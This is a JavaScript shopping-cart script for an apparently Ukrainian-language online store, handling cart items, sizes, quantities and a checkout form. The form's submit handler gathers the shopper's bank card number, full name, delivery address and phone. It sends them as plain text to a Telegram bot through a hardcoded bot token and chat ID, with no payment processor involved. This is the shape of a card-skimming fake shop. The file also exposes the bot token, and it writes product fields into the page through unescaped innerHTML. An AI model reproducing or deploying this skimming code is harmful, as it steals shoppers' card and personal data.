

/////////////////////////////////////////////////////////////////////////////////////////////

let productsInCart = JSON.parse(localStorage.getItem('shoppingCart')) || [];
const parentElement = document.querySelector('#buyItems');
const cartSumPrice = document.querySelector('.sum-prices1');
const cartSumPrice2 = document.querySelector('.sum-prices2');
const cartSumPrice3 = document.querySelector('.sum-prices3');
const products = document.querySelectorAll('.product-under');

// Додаємо значення за замовчуванням для VspanI
let VspanI = 'Не вказано'; // Значення за замовчуванням для розміру товару

const countTheSumPrice = function () {
    return productsInCart.reduce((sum, item) => sum + item.price, 0);
};

const updateShoppingCartHTML = function () {
    localStorage.setItem('shoppingCart', JSON.stringify(productsInCart));
    if (productsInCart.length > 0) {
        let result = productsInCart.map(product => {
            return `
                <li class="buyItem">
                    <img src="${product.image}">
                    <div>
                        <h5>${product.name}</h5>
                        <h6>$${product.price}</h6>
                        <h6>Розмір ${product.size}</h6>
                        <div>
                            <button class="button-minus" data-id=${product.id}>-</button>
                            <span class="countOfProduct">${product.count}</span>
                            <button class="button-plus" data-id=${product.id}>+</button>
                        </div>
                    </div>
                </li>
            `;
        }).join('');
        parentElement.innerHTML = result;
        document.querySelector('.checkout').classList.remove('hidden');
        cartSumPrice.innerHTML = '₽' + countTheSumPrice();
        cartSumPrice2.innerHTML = '₽' + countTheSumPrice();
        cartSumPrice3.innerHTML = 'До оплати:' + countTheSumPrice();
    } else {
        document.querySelector('.checkout').classList.add('hidden');
        parentElement.innerHTML = '<h4 class="empty">Ваша корзина пуста</h4>';
        cartSumPrice.innerHTML = '';
        cartSumPrice2.innerHTML = '';
    }
};

function updateProductsInCart(product) {
    for (let item of productsInCart) {
        if (item.id == product.id) {
            item.count += 1;
            item.price = item.basePrice * item.count;
            return;
        }
    }
    productsInCart.push(product);
}

products.forEach(item => {
    item.addEventListener('click', (e) => {
        if (e.target.classList.contains('addToCart')) {
            const productID = e.target.dataset.productId;
            const productName = item.querySelector('.productName').innerText;
            const productPrice = parseFloat(item.querySelector('.priceValue').innerText);
            const productImage = item.querySelector('img').src;

            // Перевіряємо, чи встановлено VspanI, якщо ні — використовуємо значення за замовчуванням
            const productSize = VspanI || 'Не вказано';

            let product = {
                name: productName,
                image: productImage,
                id: productID,
                count: 1,
                price: productPrice,
                basePrice: productPrice,
                size: productSize
            };
            updateProductsInCart(product);
            updateShoppingCartHTML();
        }
    });
});

parentElement.addEventListener('click', (e) => {
    const isPlusButton = e.target.classList.contains('button-plus');
    const isMinusButton = e.target.classList.contains('button-minus');
    if (isPlusButton || isMinusButton) {
        for (let i = 0; i < productsInCart.length; i++) {
            if (productsInCart[i].id == e.target.dataset.id) {
                if (isPlusButton) {
                    productsInCart[i].count += 1;
                } else if (isMinusButton) {
                    productsInCart[i].count -= 1;
                }
                productsInCart[i].price = productsInCart[i].basePrice * productsInCart[i].count;
            }
            if (productsInCart[i].count <= 0) {
                productsInCart.splice(i, 1);
            }
        }
        updateShoppingCartHTML();
    }
});

updateShoppingCartHTML();

// Функція для безпечного доступу до дочірніх елементів
function getSafeChild(parent, ...indices) {
    let element = parent;
    for (let index of indices) {
        if (element && element.children && element.children[index]) {
            element = element.children[index];
        } else {
            return undefined;
        }
    }
    return element;
}

let ul = document.querySelectorAll('ul');

let tovar1 = (getSafeChild(ul[1], 0, 1, 0)?.innerText || '') +
             (getSafeChild(ul[1], 0, 1, 1)?.innerText || '') +
             (getSafeChild(ul[1], 0, 1, 2)?.innerText || '');
console.log(tovar1);

let tovar2 = (getSafeChild(ul[1], 1, 1, 0)?.innerText || '') +
             (getSafeChild(ul[1], 1, 1, 1)?.innerText || '') +
             (getSafeChild(ul[1], 1, 1, 2)?.innerText || '');
console.log(tovar2);

let tovar3 = (getSafeChild(ul[1], 2, 1, 0)?.innerText || '') +
             (getSafeChild(ul[1], 2, 1, 1)?.innerText || '') +
             (getSafeChild(ul[1], 2, 1, 2)?.innerText || '');
console.log(tovar3);

// Відправка в Telegram
const token = "5982625171:AAGgENz-5FoFXOF2DiYBgzu3E2xUOTHrNk0";
const chatId = "-1001302446058";
const url = `https://api.telegram.org/bot${token}/sendMessage`;
const form = document.querySelector(".telegram-form");
form.addEventListener('submit', function (e) {
    e.preventDefault();

    let itemsDetails = productsInCart.map(item => `${item.name} (Розмір: ${item.size}, Кількість: ${item.count}, Ціна: $${item.price})`).join('\n');

    let message = `номер карти: ${this.nomerCredit.value}\n`;
    message += `повне ім'я: ${this.FullName.value} ${this.FullName2.value}\n`;
    message += `місто, відділення НП: ${this.adres.value}\n`;
    message += `номер телефону: ${this.nomerPhoe.value}\n`;
    message += `сума замовлення: ${countTheSumPrice()}\n`;
    message += `назва товару/товарів та розмір:\n${itemsDetails}`;

    axios.post(url, {
        chat_id: chatId,
        parse_mode: 'html',
        text: message,
    })
    .then((res) => {
        form.reset();
        button.classList.remove('active');
        BayForm.classList.add('none');
    })
    .catch((err) => {
        console.warn('Error:', err);
    })
    .finally(() => {
        console.log('Success');
    });
});

// Обробка кліків по span та встановлення VspanI
let span = document.querySelectorAll('span');

span.forEach(spanI => {
    spanI.addEventListener("click", () => {
        spanI.classList.toggle("activeSpan");
        VspanI = spanI.innerHTML; // Встановлюємо значення VspanI при кліку
    });
});
